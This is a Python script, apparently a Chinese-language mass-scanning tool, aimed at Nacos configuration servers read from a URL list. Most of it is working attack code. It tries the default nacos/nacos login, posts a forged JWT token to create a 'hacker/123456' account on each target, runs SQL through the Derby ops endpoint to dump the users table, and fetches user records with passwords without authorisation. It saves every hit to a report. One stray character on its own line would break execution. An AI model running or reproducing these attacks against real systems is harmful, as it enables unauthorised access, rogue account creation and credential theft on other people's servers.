#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import threading
import queue
import time
import os
import datetime
import signal
import sys
from urllib.parse import urlparse
import argparse
import urllib3
import json


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


BANNER = r"""
 _   _    _    ____   _____     _____   _   _   _   _   __   _    _ 
| \ | |  / \  / ___| |  ___|   |  ___| | | | | | | | | / /  | |  | |
|  \| | / _ \| |     | |_      | |_    | | | | | | | |/ /   | |  | |
| |\  |/ ___ \ |___  |  _|     |  _|   | |_| | | |_| |\ \   | |__| |
|_| \_/_/   \_\____| |_|       |_|      \___/   \___/  \_\  |______|
"""


class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

class NacosTester:
    def __init__(self, threads=5, timeout=10):
        self.threads = threads
        self.timeout = timeout
        self.results = []  
        self.jwt_results = []  
        self.derby_sql_results = []  
        self.unauth_results = []  
        self.lock = threading.Lock()
        self.processed = 0
        self.total = 0
        self.stop_event = threading.Event()
        
        
        self.weak_pwd_headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept': '*/*'
        }
        
        self.weak_pwd_data = 'username=nacos&password=nacos'

    def normalize_url(self, url):
        """标准化URL格式"""
        url = url.strip().rstrip('/')
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url  
        return url

    def test_weak_password(self, target_url):
        """测试Nacos弱口令漏洞"""
        try:
            normalized_url = self.normalize_url(target_url)
            
            
            endpoint1 = f"{normalized_url}/nacos/v1/auth/users/login"
            response1 = requests.post(
                endpoint1,
                data=self.weak_pwd_data,
                headers=self.weak_pwd_headers,
                timeout=self.timeout,
                verify=False,
                allow_redirects=False
            )
            
            if response1.status_code == 200 and 'accessToken' in response1.text:
                return True, f"端点1: {endpoint1}", response1.text
            
            
            endpoint2 = f"{normalized_url}/v3/auth/user/login"
            response2 = requests.post(
                endpoint2,
                data=self.weak_pwd_data,
                headers=self.weak_pwd_headers,
                timeout=self.timeout,
                verify=False,
                allow_redirects=False
            )
            
            if response2.status_code == 200 and 'accessToken' in response2.text:
                return True, f"端点2: {endpoint2}", response2.text
                
            return False, "", ""
            
        except Exception as e:
            return False, "", str(e)

    def test_jwt_vulnerability(self, target_url):
        """检测伪造JWT创建账户漏洞"""
        try:
            normalized_url = self.normalize_url(target_url)
            
            
            post_url = f"{normalized_url}/nacos/v1/auth/users?accessToken=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTc2MjE3MDA2Mn0.HNLQKW6uHLj1IpmFAXGC1iGhS-RxxHyJjRspB6CDmfA&username=hacker&password=123456"
            
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Accept': '*/*'
            }
            
            
            response = requests.post(
                post_url, 
                headers=headers, 
                timeout=self.timeout, 
                verify=False,
                allow_redirects=False
            )
            
            response_text = response.text
            
            # 判断是否存在漏洞
            vulnerability_indicators = [
                "caused: user 'hacker' already exist!",
                '{"code":200,"message":null,"data":"create user ok!"}',
                'create user ok',
                'already exist',
                'username=hacker'
            ]
            
            for indicator in vulnerability_indicators:
                if indicator.lower() in response_text.lower():
                    return True, response_text
            
            
            if response.status_code == 200:
                return True, response_text
                
            return False, response_text
            
        except Exception as e:
            return False, str(e)

    def test_derby_sql_injection(self, target_url):
        """检测Derby SQL注入漏洞"""
        try:
            normalized_url = self.normalize_url(target_url)
            
            
            sql_payload = "select%20*%20from%20users"
            sql_url = f"{normalized_url}/nacos/v1/cs/ops/derby?sql={sql_payload}"
            
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'Accept': '*/*'
            }
            
            
            response = requests.get(
                sql_url,
                headers=headers,
                timeout=self.timeout,
                verify=False,
                allow_redirects=False
            )
            
            response_text = response.text
            
            
            if response.status_code == 200:
                
                try:
                    response_json = json.loads(response_text)
                    if 'code' in response_json and response_json['code'] == 200:
                        return True, response_text
                except:
                    
                    if 'code' in response_text and '200' in response_text:
                        return True, response_text
            
            return False, response_text
            
        except Exception as e:
            return False, str(e)

    def test_unauth_user_info(self, target_url):
        """检测未授权查看用户信息漏洞"""
        try:
            normalized_url = self.normalize_url(target_url)
            
            
            user_info_url = f"{normalized_url}/nacos/v1/auth/users?pageNo=1&pageSize=9"
            
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'Accept': 'application/json, text/plain, */*'
            }
            
            
            response = requests.get(
                user_info_url,
                headers=headers,
                timeout=self.timeout,
                verify=False,
                allow_redirects=False
            )
            
            response_text = response.text
            
            
            if response.status_code == 200:
                try:
                    
                    response_json = json.loads(response_text)
                    
                    构
                    if ('totalCount' in response_json and 'pageItems' in response_json and 
                        isinstance(response_json['pageItems'], list) and len(response_json['pageItems']) > 0):
                        
                        
                        first_user = response_json['pageItems'][0]
                        if 'username' in first_user and 'password' in first_user:
                            return True, response_text
                except json.JSONDecodeError:
                    
                    if 'username' in response_text and 'password' in response_text:
                        return True, response_text
            
            return False, response_text
            
        except Exception as e:
            return False, str(e)

    def worker(self, q, pbar=None):
        """工作线程函数"""
        while not self.stop_event.is_set():
            try:
                target = q.get_nowait()
            except queue.Empty:
                break
                
            try:
                if self.stop_event.is_set():
                    break
                
                normalized_url = self.normalize_url(target)
                
                
                weak_pwd_success, endpoint, weak_pwd_response = self.test_weak_password(normalized_url)
                
                
                jwt_success, jwt_response = self.test_jwt_vulnerability(normalized_url)
                
                
                derby_sql_success, derby_sql_response = self.test_derby_sql_injection(normalized_url)
                
                
                unauth_success, unauth_response = self.test_unauth_user_info(normalized_url)
                
                
                with self.lock:
                    if weak_pwd_success:
                        self.results.append({
                            'url': normalized_url,
                            'endpoint': endpoint,
                            'response': weak_pwd_response[:200]
                        })
                        
                        print(f"{Colors.RED}{Colors.BOLD}[+] 发现弱口令nacos/nacos: {normalized_url}{Colors.RESET}", flush=True)
                
                    if jwt_success:
                        self.jwt_results.append({
                            'url': normalized_url,
                            'response': jwt_response[:200]
                        })
                       
                        print(f"{Colors.RED}{Colors.BOLD}[+] 发现伪造JWT创建账户漏洞(hacker/123456): {normalized_url}{Colors.RESET}", flush=True)
                
                    if derby_sql_success:
                        self.derby_sql_results.append({
                            'url': normalized_url,
                            'response': derby_sql_response[:200]
                        })
                       
                        print(f"{Colors.RED}{Colors.BOLD}[+] 发现Derby SQL注入漏洞: {normalized_url}{Colors.RESET}", flush=True)
                
                    if unauth_success:
                        self.unauth_results.append({
                            'url': normalized_url,
                            'response': unauth_response[:500]  
                        })
                      
                        print(f"{Colors.RED}{Colors.BOLD}[+] 发现未授权查看用户信息漏洞: {normalized_url}{Colors.RESET}", flush=True)
                
                    # 如果所有测试都失败
                    if not weak_pwd_success and not jwt_success and not derby_sql_success and not unauth_success:
                        print(f"{Colors.YELLOW}[-] 目标无漏洞: {normalized_url}{Colors.RESET}", flush=True)
                    
                    # 更新进度
                    self.processed += 1
                    if pbar:
                        pbar.update(1)
                    
            except Exception as e:
                with self.lock:
                    print(f"{Colors.RED}[!] 测试错误 {target}: {str(e)}{Colors.RESET}", flush=True)
                    self.processed += 1
                    if pbar:
                        pbar.update(1)
            finally:
                q.task_done()

    def load_targets(self, filename):
        """从文件加载目标"""
        targets = []
        try:
            with open(filename, 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        targets.append(line)
            print(f"{Colors.GREEN}[+] 成功加载 {len(targets)} 个目标{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}[!] 读取文件错误: {e}{Colors.RESET}")
        return targets

    def save_results(self):
        """保存所有结果到单个合并文件"""
        script_dir = os.path.dirname(os.path.abspath(__file__))
        nacos_dir = os.path.join(script_dir, "nacos")
        
        # 如果nacos目录不存在，则创建
        if not os.path.exists(nacos_dir):
            os.makedirs(nacos_dir)
            print(f"{Colors.BLUE}[*] 创建nacos目录: {nacos_dir}{Colors.RESET}")
        
        # 生成合并文件名
        now = datetime.datetime.now()
        merged_filename = f"nacos漏扫结果{now.strftime('%Y%m%d_%H%M')}.txt"
        merged_file = os.path.join(nacos_dir, merged_filename)
        
        
        with open(merged_file, 'w', encoding='utf-8') as f:
            
            f.write("Nacos安全扫描结果报告\n")
            f.write("=" * 60 + "\n")
            f.write(f"扫描时间: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"扫描目标总数: {self.total}\n")
            f.write(f"发现弱口令漏洞: {len(self.results)} 个\n")
            f.write(f"发现伪造JWT创建账户漏洞: {len(self.jwt_results)} 个\n")
            f.write(f"发现Derby SQL注入漏洞: {len(self.derby_sql_results)} 个\n")
            f.write(f"发现未授权查看用户信息漏洞: {len(self.unauth_results)} 个\n")
            f.write("=" * 60 + "\n\n")
            
            
            f.write("1. 弱口令漏洞检测结果\n")
            f.write("-" * 50 + "\n")
            if self.results:
                for i, result in enumerate(self.results, 1):
                    f.write(f"{i}. URL: {result['url']}\n")
                    f.write(f"   端点: {result['endpoint']}\n")
                    f.write(f"   响应摘要: {result['response']}\n")
                    f.write("\n")
            else:
                f.write("未发现弱口令漏洞\n")
            f.write("\n")
            
            
            f.write("2. 伪造JWT创建账户漏洞检测结果\n")
            f.write("-" * 50 + "\n")
            if self.jwt_results:
                for i, result in enumerate(self.jwt_results, 1):
                    f.write(f"{i}. URL: {result['url']}\n")
                    f.write(f"   漏洞类型: Nacos 伪造JWT创建账户漏洞\n")
                    f.write(f"   响应摘要: {result['response']}\n")
                    f.write("\n")
            else:
                f.write("未发现伪造JWT创建账户漏洞\n")
            f.write("\n")
            
            
            f.write("3. Derby SQL注入漏洞检测结果\n")
            f.write("-" * 50 + "\n")
            if self.derby_sql_results:
                for i, result in enumerate(self.derby_sql_results, 1):
                    f.write(f"{i}. URL: {result['url']}\n")
                    f.write(f"   漏洞类型: Nacos Derby SQL注入漏洞(CNVD-2020-67618)\n")
                    f.write(f"   响应摘要: {result['response']}\n")
                    f.write("\n")
            else:
                f.write("未发现Derby SQL注入漏洞\n")
            f.write("\n")
            
            
            f.write("4. 未授权查看用户信息漏洞检测结果\n")
            f.write("-" * 50 + "\n")
            if self.unauth_results:
                for i, result in enumerate(self.unauth_results, 1):
                    f.write(f"{i}. URL: {result['url']}\n")
                    f.write(f"   漏洞类型: Nacos 未授权查看用户信息漏洞\n")
                    f.write(f"   响应摘要: {result['response']}\n")
                    f.write("\n")
            else:
                f.write("未发现未授权查看用户信息漏洞\n")
            f.write("\n")
            
            
            f.write("5. 扫描统计信息\n")
            f.write("-" * 50 + "\n")
            f.write(f"总目标数: {self.total}\n")
            f.write(f"成功检测: {self.processed}\n")
            f.write(f"弱口令漏洞: {len(self.results)} 个\n")
            f.write(f"伪造JWT创建账户漏洞: {len(self.jwt_results)} 个\n")
            f.write(f"Derby SQL注入漏洞: {len(self.derby_sql_results)} 个\n")
            f.write(f"未授权查看用户信息漏洞: {len(self.unauth_results)} 个\n")
            f.write(f"无漏洞目标: {self.total - len(self.results) - len(self.jwt_results) - len(self.derby_sql_results) - len(self.unauth_results)} 个\n")
        
        print(f"{Colors.GREEN}[+] 所有漏洞结果已合并保存到: {merged_file}{Colors.RESET}")
        
        
        if not self.results and not self.jwt_results and not self.derby_sql_results and not self.unauth_results:
            no_vuln_file = os.path.join(nacos_dir, f"无漏洞目标{now.strftime('%Y%m%d_%H%M')}.txt")
            with open(no_vuln_file, 'w', encoding='utf-8') as f:
                f.write(f"检测时间: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write("未发现存在漏洞的目标\n")
            print(f"{Colors.YELLOW}[+] 无漏洞结果已保存到: {no_vuln_file}{Colors.RESET}")

    def find_input_file(self, input_file):
        """智能查找输入文件"""
        
        if os.path.exists(input_file):
            return input_file
        
        
        script_dir = os.path.dirname(os.path.abspath(__file__))
        script_dir_file = os.path.join(script_dir, input_file)
        if os.path.exists(script_dir_file):
            return script_dir_file
        
        
        current_dir_file = os.path.join(os.getcwd(), input_file)
        if os.path.exists(current_dir_file):
            return current_dir_file
        
        
        return input_file

    def run(self, input_file="url.txt", single_url=None):
        """主运行函数"""
        print(f"{Colors.CYAN}开始Nacos安全检测...{Colors.RESET}")
        print(f"{Colors.BLUE}[*] 检测类型: 弱口令 + 伪造JWT创建账户漏洞 + Derby SQL注入漏洞 + 未授权查看用户信息漏洞{Colors.RESET}")
        print(f"{Colors.BLUE}[*] 线程数: {self.threads}{Colors.RESET}")
        print(f"{Colors.BLUE}[*] 超时时间: {self.timeout}秒{Colors.RESET}")
        
        
        signal.signal(signal.SIGINT, self.signal_handler)
        
        
        if single_url:
            targets = [single_url]
            print(f"{Colors.BLUE}[*] 扫描单个URL: {single_url}{Colors.RESET}")
        else:
            
            actual_input_file = self.find_input_file(input_file)
            print(f"{Colors.BLUE}[*] 使用输入文件: {actual_input_file}{Colors.RESET}")
            
            
            if not os.path.exists(actual_input_file):
                print(f"{Colors.RED}[!] 输入文件不存在: {actual_input_file}{Colors.RESET}")
                print(f"{Colors.RED}[!] 请确保url.txt文件存在，或使用-u参数指定单个URL{Colors.RESET}")
                return
            
            # 加载目标
            targets = self.load_targets(actual_input_file)
            if not targets:
                print(f"{Colors.RED}[!] 没有找到有效的目标{Colors.RESET}")
                return
            
        self.total = len(targets)
        print(f"{Colors.BLUE}[*] 加载目标数量: {self.total}{Colors.RESET}")
        
        if self.total == 0:
            print(f"{Colors.RED}[!] 没有目标需要测试{Colors.RESET}")
            return
        
        # 创建队列
        q = queue.Queue()
        for target in targets:
            q.put(target)
        
        # 创建进度显示
        try:
            from tqdm import tqdm
            pbar = tqdm(total=self.total, desc="测试进度")
        except ImportError:
            pbar = None
            print(f"{Colors.YELLOW}[*] 建议安装tqdm库来显示进度条: pip install tqdm{Colors.RESET}")
        
        # 启动工作线程
        threads = []
        for i in range(min(self.threads, self.total)):
            t = threading.Thread(target=self.worker, args=(q, pbar))
            t.daemon = True
            t.start()
            threads.append(t)
        
        
        start_time = time.time()
        try:
            
            while not q.empty() and not self.stop_event.is_set():
                time.sleep(0.5)
        except KeyboardInterrupt:
            self.stop_event.set()
            print(f"\n{Colors.RED}[!] 用户中断操作，正在停止...{Colors.RESET}")
        
        
        for t in threads:
            t.join(timeout=1.0)
        
        if pbar:
            pbar.close()
        
        
        end_time = time.time()
        elapsed_time = end_time - start_time
        
        
        print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
        print(f"{Colors.BLUE}[*] 测试{'完成' if not self.stop_event.is_set() else '中断'}!{Colors.RESET}")
        print(f"{Colors.BLUE}[*] 总目标数: {self.total}{Colors.RESET}")
        print(f"{Colors.BLUE}[*] 成功检测: {self.processed}{Colors.RESET}")
        print(f"{Colors.GREEN}[*] 发现弱口令: {len(self.results)}{Colors.RESET}")
        print(f"{Colors.GREEN}[*] 发现伪造JWT创建账户漏洞: {len(self.jwt_results)}{Colors.RESET}")
        print(f"{Colors.GREEN}[*] 发现Derby SQL注入漏洞: {len(self.derby_sql_results)}{Colors.RESET}")
        print(f"{Colors.GREEN}[*] 发现未授权查看用户信息漏洞: {len(self.unauth_results)}{Colors.RESET}")
        print(f"{Colors.BLUE}[*] 耗时: {elapsed_time:.2f}秒{Colors.RESET}")
        
        
        self.save_results()
        
        
        if self.stop_event.is_set():
            print(f"{Colors.RED}[!] 用户中断操作，部分目标未完成测试{Colors.RESET}")

    def signal_handler(self, signum, frame):
        """处理中断信号"""
        print(f"\n{Colors.RED}[!] 收到中断信号，正在停止...{Colors.RESET}")
        self.stop_event.set()


def print_banner():
    """打印ASCII艺术字标题"""
    print(Colors.CYAN + BANNER + Colors.RESET)
    print("=" * 60)
    print("Nacos安全批量检测工具")
    print("功能: 弱口令检测 + 伪造JWT创建账户漏洞 + Derby SQL注入漏洞检测 + 未授权查看用户信息漏洞检测")
    print("https://github.com/tianxing226/nacos-fuck")
    print("作者: 窝有菠萝心")
    print("版本: 1.0")
    print("=" * 60)
    print()


def main():
    
    print_banner()
    
    parser = argparse.ArgumentParser(description="Nacos安全检测工具")
    parser.add_argument("-i", "--input", default="url.txt", help="输入文件路径 (默认: url.txt)")
    parser.add_argument("-u", "--url", help="扫描单个URL")
    parser.add_argument("-t", "--threads", type=int, default=10, help="线程数 (默认: 10)")
    parser.add_argument("-T", "--timeout", type=int, default=6, help="超时时间(秒) (默认: 6)")
    
    args = parser.parse_args()
    
    
    if args.url and args.input != "url.txt":
        print(f"{Colors.RED}[!] 错误：不能同时使用 -u 和 -i 参数{Colors.RESET}")
        sys.exit(1)
    
    
    tester = NacosTester(threads=args.threads, timeout=args.timeout)
    tester.run(args.input, args.url)


if __name__ == "__main__":
    main()
